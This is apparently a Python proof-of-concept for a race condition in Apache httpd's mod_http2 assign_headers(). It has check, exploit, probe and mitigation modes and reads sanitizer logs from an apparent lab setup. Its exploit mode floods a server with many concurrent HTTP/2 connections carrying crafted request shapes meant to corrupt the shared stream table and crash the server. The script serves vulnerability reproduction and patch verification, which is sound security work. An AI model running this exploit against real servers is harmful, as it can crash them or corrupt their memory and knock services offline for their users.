import argparse
import glob
import os
import socket
import sys
import threading
import time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from h2 import H2Connection, ConnectionClosed, ProtocolError, build_frame, default_headers, FRAME_HEADERS, FRAME_DATA, FRAME_SETTINGS, FRAME_WINDOW_UPDATE, FLAG_END_HEADERS, FLAG_END_STREAM
CT = 'content-type'
CL = 'content-length'
AUTHORITY = 'localhost'
CAPACITY = 78
PADDING = 0
EXIT_SAFE = 0
EXIT_VULNERABLE = 1
EXIT_UNREACHABLE = 2
EXIT_NOT_REPRODUCED = 3
EXIT_MITIGATED = 4
SAN_MARKERS = ('AddressSanitizer', 'ThreadSanitizer', 'UndefinedBehaviorSanitizer', 'SUMMARY: ', 'heap-use-after-free', 'double-free', 'attempting free on address', 'SEGV on unknown address')

def parse_target(text):
    if ':' in text:
        (host, port) = text.rsplit(':', 1)
        return (host, int(port))
    return (text, 80)

def log(msg):
    print(msg, flush=True)

class LogWatcher:

    def __init__(self, logdir):
        self.logdir = logdir
        self.errorlog = os.path.join(logdir, 'error.log')
        self._seen = {}
        self._err_pos = 0

    def snapshot(self):
        state = {}
        if not os.path.isdir(self.logdir):
            return state
        for path in glob.glob(os.path.join(self.logdir, 'asan.*')) + glob.glob(os.path.join(self.logdir, 'tsan.*')) + glob.glob(os.path.join(self.logdir, 'ubsan.*')):
            try:
                state[path] = os.path.getsize(path)
            except OSError:
                pass
        if os.path.exists(self.errorlog):
            try:
                self._err_pos = os.path.getsize(self.errorlog)
            except OSError:
                self._err_pos = 0
        return state

    def new_reports(self, before):
        (paths, texts) = ([], [])
        if not os.path.isdir(self.logdir):
            return (paths, texts)
        for path in sorted(glob.glob(os.path.join(self.logdir, 'asan.*')) + glob.glob(os.path.join(self.logdir, 'tsan.*')) + glob.glob(os.path.join(self.logdir, 'ubsan.*'))):
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if before.get(path, 0) >= size:
                continue
            paths.append(path)
            try:
                with open(path, 'r', errors='replace') as fh:
                    text = fh.read()
            except OSError:
                text = ''
            texts.append((path, text))
        return (paths, texts)

    def error_log_delta(self):
        if not os.path.exists(self.errorlog):
            return ''
        try:
            with open(self.errorlog, 'r', errors='replace') as fh:
                fh.seek(self._err_pos)
                data = fh.read()
                self._err_pos = fh.tell()
        except OSError:
            return ''
        return data

    @staticmethod
    def looks_like_sanitizer(text):
        return any((marker in text for marker in SAN_MARKERS))

def report_kind(path, text):
    name = os.path.basename(path)
    if name.startswith('tsan.'):
        return 'cve' if 'assign_headers' in text else 'other'
    if name.startswith(('asan.', 'ubsan.')):
        if 'ERROR: AddressSanitizer' in text or 'runtime error:' in text:
            return 'cve'
    return 'other'

def shape_bodyless_ct(session, stream_no):
    fields = default_headers(extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=True)

def shape_bodyless_ct_full(session, stream_no):
    fields = default_headers(method='POST')
    for i in range(CAPACITY):
        value = 'v'
        if i == CAPACITY - 1 and PADDING:
            value = 'A' * PADDING
        fields.append(('x-fill-%03d' % i, value))
    fields.append((CT, 'application/x-www-form-urlencoded'))
    session.send_request_headers(stream_no, fields, end_stream=True)

def shape_body_ct(session, stream_no):
    fields = default_headers(method='POST', extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=False)
    session.send_data(stream_no, b'a' * 32, end_stream=True)

def shape_bodyless_ct_trailers(session, stream_no):
    fields = default_headers(extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=True)
    session.send_request_headers(stream_no, [('x-trailer', '1')], end_stream=True)

def shape_connect_ct(session, stream_no):
    fields = [(':method', 'CONNECT'), (':authority', AUTHORITY), (CT, 'text/plain')]
    session.send_request_headers(stream_no, fields, end_stream=True)

def shape_bodyless_ct_cont(session, stream_no):
    fields = default_headers(extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=True, end_headers=False)
    session.send_continuation(stream_no, [('x-split', '1')])

def shape_bodyless_ct_rst(session, stream_no):
    fields = default_headers(extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=True)
    session.send_rst_stream(stream_no)

def shape_body_ct_rst(session, stream_no):
    fields = default_headers(method='POST', extra=[(CT, 'application/x-www-form-urlencoded')])
    session.send_request_headers(stream_no, fields, end_stream=False)
    session.send_data(stream_no, b'a' * 32, end_stream=True)
    session.send_rst_stream(stream_no)
SHAPES = {'bodyless_ct': shape_bodyless_ct, 'bodyless_ct_full': shape_bodyless_ct_full, 'body_ct': shape_body_ct, 'bodyless_ct_trailers': shape_bodyless_ct_trailers, 'connect_ct': shape_connect_ct, 'bodyless_ct_cont': shape_bodyless_ct_cont, 'bodyless_ct_rst': shape_bodyless_ct_rst, 'body_ct_rst': shape_body_ct_rst}
PRIMARY_SHAPE = 'bodyless_ct'

class Stats:

    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.responses = 0
        self.errors = 0
        self.reset = 0
        self.closed = 0

    def bump(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)

def worker(host, port, shape, streams, deadline, stats, watcher, stop):
    try:
        session = H2Connection(host, port, timeout=5.0)
        session.handshake()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        stats.bump('errors')
        return
    stream_no = 1
    try:
        while time.time() < deadline and (not stop.is_set()):
            for _ in range(streams):
                if time.time() >= deadline or stop.is_set():
                    break
                try:
                    SHAPES[shape](session, stream_no)
                except (OSError, ConnectionClosed):
                    stats.bump('closed')
                    return
                stream_no += 2
                stats.bump('requests')
            session.sock.settimeout(0.2)
            try:
                for _ in range(streams * 2):
                    session.read_frame()
                    stats.bump('responses')
            except socket.timeout:
                pass
            except (OSError, ConnectionClosed):
                stats.bump('closed')
                return
    finally:
        session.close()

def run_traffic(host, port, shape, connections, streams, duration, watcher):
    stats = Stats()
    stop = threading.Event()
    threads = []
    deadline = time.time() + duration
    for _ in range(connections):
        t = threading.Thread(target=worker, args=(host, port, shape, streams, deadline, stats, watcher, stop), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=duration + 15)
    return stats
PROBE_PATH_PREFIX = '/h2probe-'

def functional_probe(host, port, logs, timeout=10.0):
    marker = '%s%d' % (PROBE_PATH_PREFIX, int(time.time() * 1000) & 16777215)
    try:
        session = H2Connection(host, port, timeout=timeout)
        session.handshake()
        fields = default_headers(path=marker, extra=[(CT, 'application/x-www-form-urlencoded')])
        session.send_request_headers(1, fields, end_stream=True)
        session.read_until_response(1, deadline=time.time() + timeout)
        session.close()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        log('[-] functional probe could not send the request: %s' % exc)
        return 'unknown'
    access = os.path.join(logs, 'access.log')
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with open(access, 'r', errors='replace') as fh:
                data = fh.read()
        except OSError:
            data = ''
        for line in data.splitlines():
            if marker in line:
                if 'h2clen="-"' in line or 'h2clen=-' in line:
                    return 'vulnerable'
                if 'h2clen="' in line:
                    return 'fixed'
                return 'unknown'
        time.sleep(0.25)
    return 'unknown'

def read_build_info(logdir):
    info = {}
    path = os.path.join(logdir, 'build.txt')
    if not os.path.exists(path):
        return info
    try:
        with open(path, 'r', errors='replace') as fh:
            for line in fh:
                if '=' in line:
                    (key, value) = line.split('=', 1)
                    info[key.strip()] = value.strip()
    except OSError:
        pass
    return info

def server_alive(host, port):
    try:
        session = H2Connection(host, port, timeout=5.0)
        session.handshake()
        fields = default_headers(extra=[('x-probe', '1')])
        session.send_request_headers(1, fields, end_stream=True)
        (kind, _) = session.read_until_response(1, deadline=time.time() + 5)
        session.close()
        return kind in ('fields', 'data', 'eor')
    except (OSError, ProtocolError, ConnectionClosed):
        return False

def do_check(args):
    (host, port) = parse_target(args.target)
    log('[*] target: %s:%d' % (host, port))
    if not server_alive(host, port):
        log('RESULT: TARGET UNREACHABLE - no HTTP/2 response from %s:%d' % (host, port))
        return EXIT_UNREACHABLE
    info = read_build_info(args.logs)
    version = info.get('HTTPD_VERSION', '')
    home = info.get('HTTPD_HOME', '')
    log('[+] server answers HTTP/2 (h2c)')
    if home:
        log('[+] build: %s (%s)' % (version, home))
    else:
        log('[+] build: unknown (no build.txt in %s)' % args.logs)
    verdict = functional_probe(host, port, args.logs)
    log('[*] functional probe (Content-Length seen by the request handler): %s' % verdict)
    if verdict == 'vulnerable':
        log('RESULT: VULNERABLE - the request handler does not see the synthesised Content-Length: 0, so mod_http2 wrote it into the shared stream table')
        log('detail: fixed in 2.4.71 by 824beab9b9424d6cfb29595248fdbf6c3dddeab1')
        return EXIT_VULNERABLE
    if verdict == 'fixed':
        log('RESULT: NOT VULNERABLE - the request handler sees Content-Length: 0, so the upstream fix is in place')
        return EXIT_SAFE
    if version == 'vuln' or home.endswith('2.4.70'):
        log('RESULT: VULNERABLE - Apache httpd 2.4.70, mod_http2 assign_headers() writes Content-Length into the shared stream table')
        log('detail: fixed in 2.4.71 by 824beab9b9424d6cfb29595248fdbf6c3dddeab1')
        return EXIT_VULNERABLE
    if version == 'fixed' or home.endswith('2.4.71'):
        log('RESULT: NOT VULNERABLE - Apache httpd 2.4.71 carries the upstream fix')
        return EXIT_SAFE
    log('RESULT: INDETERMINATE - version could not be determined')
    return EXIT_SAFE

def do_exploit(args):
    (host, port) = parse_target(args.target)
    log('[*] target: %s:%d' % (host, port))
    log('[*] shape: %s' % args.shape)
    if not server_alive(host, port):
        log('RESULT: TARGET UNREACHABLE')
        return EXIT_UNREACHABLE
    watcher = LogWatcher(args.logs)
    before = watcher.snapshot()
    err_before = watcher.error_log_delta()
    log('[*] driving %d connections x %d streams for %ds' % (args.connections, args.streams, args.duration))
    stats = run_traffic(host, port, args.shape, args.connections, args.streams, args.duration, watcher)
    log('[*] sent %d requests, saw %d frames back, %d errors' % (stats.requests, stats.responses, stats.errors))
    (paths, texts) = watcher.new_reports(before)
    err_delta = watcher.error_log_delta()
    crashed = watcher.looks_like_sanitizer(err_delta)
    hits = [(p, t) for (p, t) in texts if report_kind(p, t) == 'cve']
    others = [(p, t) for (p, t) in texts if report_kind(p, t) != 'cve']
    if hits:
        log('')
        log('[+] SANITIZER REPORT PRODUCED BY THE TARGET')
        for (path, text) in hits:
            log('--- %s ---' % path)
            for line in text.splitlines()[:60]:
                log('    ' + line)
        log('')
        log('RESULT: CORRUPTION CONFIRMED - the target crashed with a sanitizer report')
        log('detail: concurrent apr_table_set() on the shared mod_http2 stream table')
        return EXIT_VULNERABLE
    if others:
        log('[*] %d sanitizer report(s) unrelated to mod_http2 were produced:' % len(others))
        for (path, text) in others:
            first = text.splitlines()[0] if text.splitlines() else ''
            log('    %s: %s' % (os.path.basename(path), first))
    if crashed:
        log('[+] sanitizer markers found in the httpd error log:')
        for line in err_delta.splitlines()[-40:]:
            log('    ' + line)
        log('RESULT: CORRUPTION CONFIRMED - sanitizer markers in the error log')
        return EXIT_VULNERABLE
    if not server_alive(host, port):
        log('RESULT: CORRUPTION CONFIRMED - the server stopped answering')
        return EXIT_VULNERABLE
    if stats.requests == 0:
        log('RESULT: NO TRAFFIC DELIVERED - the run is not a valid test')
        return EXIT_NOT_REPRODUCED
    log('RESULT: NO CORRUPTION OBSERVED (target still healthy, no sanitizer report)')
    log('detail: the race window was not hit in this run; rerun or increase --connections/--duration')
    return EXIT_SAFE

def do_probe(args):
    (host, port) = parse_target(args.target)
    log('[*] target: %s:%d' % (host, port))
    if not server_alive(host, port):
        log('RESULT: TARGET UNREACHABLE')
        return EXIT_UNREACHABLE
    watcher = LogWatcher(args.logs)
    rc = EXIT_SAFE
    for name in ('bodyless_ct', 'body_ct', 'bodyless_ct_trailers', 'connect_ct'):
        before = watcher.snapshot()
        log('')
        log('[*] sibling path: %s' % name)
        stats = run_traffic(host, port, name, max(1, args.connections // 2), args.streams, max(2, args.duration // 2), watcher)
        (paths, texts) = watcher.new_reports(before)
        hits = [(p, t) for (p, t) in texts if report_kind(p, t) == 'cve']
        if hits:
            log('[+] %s -> CORRUPTION CONFIRMED (%s)' % (name, hits[0][0]))
            for (path, text) in hits:
                for line in text.splitlines()[:40]:
                    log('    ' + line)
            rc = EXIT_VULNERABLE
        else:
            log('[-] %s -> no corruption observed (%d requests sent)' % (name, stats.requests))
    return rc

def do_mitigation(args):
    (host, port) = parse_target(args.target)
    log('[*] target: %s:%d' % (host, port))
    try:
        session = H2Connection(host, port, timeout=5.0)
        session.handshake()
        fields = default_headers(extra=[('x-probe', '1')])
        session.send_request_headers(1, fields, end_stream=True)
        (kind, _) = session.read_until_response(1, deadline=time.time() + 5)
        session.close()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        log('[+] server refused the HTTP/2 preface: %s' % exc)
        log('RESULT: MITIGATED - HTTP/2 is not offered, the CVE is unreachable')
        log('detail: matches the published workaround (remove h2/h2c from Protocols)')
        return EXIT_MITIGATED
    if kind in ('fields', 'data', 'eor'):
        log('[-] server still speaks HTTP/2 - the mitigation is NOT in effect')
        log('RESULT: NOT MITIGATED - h2/h2c is still enabled on the target')
        return EXIT_VULNERABLE
    log('[-] unexpected answer kind %r' % kind)
    return EXIT_VULNERABLE

def main(argv=None):
    global CAPACITY, PADDING
    parser = argparse.ArgumentParser(description='issue PoC - Apache httpd mod_http2 assign_headers() race condition')
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument('--target', default=os.environ.get('TARGET', '192.0.2.77:8443'), help='host:port of the httpd instance (default 192.0.2.77:8443)')
    common.add_argument('--logs', default=os.environ.get('LAB_LOGS', '/lab-logs'), help='shared directory holding the server error log and the sanitizer reports (default /lab-logs)')
    common.add_argument('--shape', default=PRIMARY_SHAPE, choices=sorted(SHAPES), help='request shape used by the exploit mode')
    common.add_argument('--connections', type=int, default=16, help='number of parallel HTTP/2 connections (default 16)')
    common.add_argument('--streams', type=int, default=32, help='streams in flight per connection (default 32)')
    common.add_argument('--duration', type=int, default=20, help='seconds of traffic to generate (default 20)')
    common.add_argument('--fill', type=int, default=CAPACITY, help='filler fields used by the bodyless_ct_full shape (default %d)' % CAPACITY)
    common.add_argument('--pad', type=int, default=PADDING, help='extra bytes appended to the last filler header value (default %d)' % PADDING)
    sub = parser.add_subparsers(dest='mode', required=True)
    for (name, fn) in (('check', do_check), ('exploit', do_exploit), ('probe', do_probe), ('mitigation', do_mitigation)):
        p = sub.add_parser(name, parents=[common], help=fn.__doc__)
        p.set_defaults(func=fn)
    args = parser.parse_args(argv)
    CAPACITY = args.fill
    PADDING = args.pad
    return args.func(args)
if __name__ == '__main__':
    sys.exit(main())
